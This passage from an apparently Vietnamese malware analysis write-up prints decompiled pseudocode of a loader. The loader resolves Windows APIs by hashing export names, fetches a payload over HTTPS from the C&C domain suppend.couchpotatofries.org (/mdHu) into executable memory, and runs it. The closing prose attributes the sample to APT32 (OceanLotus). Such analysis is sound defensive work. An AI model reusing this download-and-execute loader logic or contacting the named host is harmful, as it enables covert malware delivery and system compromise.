  v16 = v11 + v15;
  v17 = v11 + *(_DWORD *)(v13 + v11 + 28);
  v172 = 0;
  v170 = v17;
  v18 = 0;
  v190 = (_DWORD *)v16;
  v191 = 0;
  if ( !*(_DWORD *)(v13 + v11 + 24) )
    goto LABEL_23;
  while ( 1 )
  {
    v19 = 0;
    v20 = (_BYTE *)(v11 + *(_DWORD *)(v16 + 4 * v18));
    v21 = 0;
    if ( *v20 )
      break;
LABEL_20:
    v191 = ++v18;
    if ( v18 >= *(_DWORD *)(v189 + v11 + 24) )
      goto LABEL_23;
  }
  do
  {
    v22 = (char)v20[v21] % 16;
    v23 = v21 + (char)v20[v21] / 16;
    ++v21;
    v19 = 16 * v22 + v23 + 3 * v19;
  }
  while ( v20[v21] );
  v18 = v191;
  if ( v19 != 50823829 )
  {
    v11 = (int)v192;
    v16 = (int)v190;
    goto LABEL_20;
  }
  v172 = (int (__stdcall *)(int))((char *)v192 + *(_DWORD *)(v170 + 4 * *(unsigned __int16 *)(v188 + 2 * v191)));
LABEL_23:
  v173 = 1852990827;
  v63 = &v173;
  v24 = (int *)&v66;
  v174 = 842230885;
  v64 = 3;
  v175 = 1819042862;
  v65 = &v112;
  v25 = 3;
  v176 = 0;
  v66 = &v91;
  v67 = &v180;
  v69 = &v83;
  v70 = &v94;
  v71 = &v177;
  v73 = &v75;
  v112 = 10736;
  v113 = 28379480;
  v114 = &unk_905946;
  v180 = 1668707181;
  v181 = 1680766066;
  v182 = 27756;
  v183 = 0;
  v83 = 23003;
  v84 = 65749;
  v85 = 35702;
  v86 = 111739;
  v87 = 37225;
  v88 = 65583;
  v89 = 66060;
  v90 = 3467;
  v177 = 1768843639;
  v178 = 779380078;
  v179 = 7105636;
  v75 = 126541239;
  v76 = 1658635775;
  v77 = -878564371;
  v78 = -1886643706;
  v79 = -1914029320;
  v80 = -279214784;
  v81 = -878775728;
  v82 = 2047362785;
  v68 = 8;
  v72 = 8;
  v74 = &v103;
  v192 = (int *)&v66;
  v190 = (_DWORD *)3;
  do
  {
    v26 = *(v24 - 3);
    v167 = (int *)*v24;
    v27 = v167;
    *v27 = v172(v26);
    v28 = 0;
    v117 = *((unsigned __int16 *)v24 - 4);
    v191 = 0;
    if ( v117 )
    {
      v118 = v27 + 1;
      do
      {
        v29 = *v27;
        v30 = 0;
        v170 = v29;
        v31 = *(_DWORD *)(v29 + 60);
        v32 = *(_DWORD *)(v31 + v29 + 120);
        v33 = *(_DWORD *)(v31 + v29 + 124);
        v123 = v32;
        if ( v32 && (unsigned int)(v32 + v33) < *(_DWORD *)(v31 + v29 + 80) )
        {
          v34 = 0;
          v35 = *(_DWORD *)(v32 + v29 + 32);
          v120 = v29 + *(_DWORD *)(v32 + v29 + 36);
          v36 = v29 + v35;
          v37 = v29 + *(_DWORD *)(v32 + v29 + 28);
          v121 = 0;
          v119 = v37;
          v122 = v36;
          v188 = 0;
          if ( *(_DWORD *)(v32 + v29 + 24) )
          {
            v38 = *(_DWORD *)(*(v192 - 1) + 4 * v191);
            v189 = *(_DWORD *)(*(v192 - 1) + 4 * v191);
            while ( 1 )
            {
              v39 = 0;
              v40 = (_BYTE *)(v29 + *(_DWORD *)(v36 + 4 * v34));
              v41 = 0;
              if ( *v40 )
              {
                do
                {
                  v42 = (char)v40[v39] % 16;
                  v43 = v39 + (char)v40[v39] / 16;
                  ++v39;
                  v41 = 16 * v42 + v43 + 3 * v41;
                }
                while ( v40[v39] );
                v34 = v188;
                v29 = v170;
                v38 = v189;
              }
              if ( v41 == v38 )
                break;
              ++v34;
              v36 = v122;
              v188 = v34;
              v38 = v189;
              if ( v34 >= *(_DWORD *)(v123 + v29 + 24) )
              {
                v30 = v121;
                goto LABEL_37;
              }
            }
            v30 = v29 + *(_DWORD *)(v119 + 4 * *(unsigned __int16 *)(v120 + 2 * v34));
          }
LABEL_37:
          v28 = v191;
        }
        v27 = v167;
        v118[v28++] = v30;
        v191 = v28;
      }
      while ( v28 < v117 );
      v24 = v192;
      v25 = (signed int)v190;
    }
    v24 += 4;
    --v25;
    v192 = v24;
    v190 = (_DWORD *)v25;
  }
  while ( v25 );
  v124 = 7274573;
  v125 = 6881402;
  v126 = 7077996;
  v127 = 3080289;
  v128 = 3014709;
  v129 = 2097200;
  v130 = 6488104;
  v131 = 7143535;
  v132 = 6357104;
  v133 = 6881396;
  v134 = 7077986;
  v135 = 3866725;
  v136 = 5046304;
  v137 = 4784211;
  v138 = 2097221;
  v139 = 3014713;
  v140 = 3866672;
  v141 = 5701664;
  v142 = 7209065;
  v143 = 7274596;
  v144 = &unk_730077;
  v145 = 5111840;
  v146 = 2097236;
  v147 = 3014710;
  v148 = 3866673;
  v149 = 5505056;
  v150 = 6881394;
  v151 = 6619236;
  v152 = &unk_74006E;
  v153 = 3473455;
  v154 = 3145774;
  v155 = 41;
  _wininet_InternetCrackUrlW(&v56, 0, 520);
  _wininet_InternetCrackUrlW(&v55, 0, 520);
  v169 = 47;
  v44 = v97(a1 + 18, &v169);
  v98(&v56, a1, (v44 - a1) >> 1);
  v45 = v99(v44);
  v98(&v55, v44, v45);
  result = _wininet_InternetOpenW(&v124, 0, 0, 0, 0);
  v46 = result;
  v192 = (int *)result;
  if ( result )
  {
    _wininet_InternetCrackUrlW((char *)&v57, 0, 60);
    v57 = (WCHAR *)60;
    v58 = -1;
    v61 = -1;
    if ( v105(&v56, 0, 0, &v57) )
    {
      v47 = _wininet_InternetConnectW(v46, v60, v62, 0, 0, 3, 0, 0);
      v167 = (int *)v47;
      if ( v47 )
      {
        v48 = 0;
        v165 = 3080234;
        if ( v59 == 4 )
          v48 = &unk_800000;
        v166 = 42;
        v116 = 0;
        v115 = &v165;
        v163 = (_WORD *)(&loc_450046 + 1);
        v164 = 84;
        v49 = _wininet_HttpOpenRequestW(v47, &v163, &v55, 0, 0, &v115, v48, 0);
        v50 = v49;
        if ( v49 )
        {
          if ( _wininet_HttpSendRequestW(v49, 0, 0, 0, 0) )
          {
            v51 = _msvcrt_calloc(0x100000, 1);
            v193 = (void (*)(void))_kernel32_VirtualAlloc(0, 10485760, 12288, 64);
            if ( v193 && v51 )
            {
              v52 = 0;
LABEL_51:
              if ( _wininet_InternetQueryDataAvailable(v50, &v171, 0, 0) )
              {
                v53 = v171;
                if ( v171 )
                {
                  while ( 1 )
                  {
                    if ( v53 > 0x100000 )
                      v53 = 0x100000;
                    if ( !v110(v50, v51, v53, &v168) )
                      goto LABEL_61;
                    v100((char *)v193 + v52, v51, v168);
                    v52 += v168;
                    v53 = v171 - v168;
                    v171 -= v168;
                    if ( !v171 )
                      goto LABEL_51;
                  }
                }
                v54 = v193;
                v184 = 0;
                v185 = 0;
                v186 = 1836597052;
                v187 = 108;
                if ( v101(v193, &v184, 5) && v101(v193, &v186, 5) )
                  v193();
              }
              else
              {
LABEL_61:
                v54 = v193;
              }
              v93(v54, 10485760, 0x8000);
              v102(v51);
              v47 = (int)v167;
            }
            v46 = (int)v192;
          }
          v111(v50);
        }
        v111(v47);
      }
    }
    result = ((int (__stdcall *)(int))v111)(v46);
  }
  return result;
}
```

Mã độc thực hiện mở kết nối tới domain **suppend.couchpotatofries.org** qua port 443:

![Screenshot](/img9.png?raw=true "Screenshot")

Sau đó gửi request GET tới uri `/mdHu`, tại đây mã độc sẽ download mã thực thi từ url `https://suppend.couchpotatofries.org/mdHu` sau đó thực thi tương tự như các bước trước đã phân tích.

Như vậy, có thể kết luận đây là mã độc tấn công APT có C&C server là `suppend.couchpotatofries.org`, rất có thể mã độc này có liên quan tới chiến dịch APT32 (OceanLotus).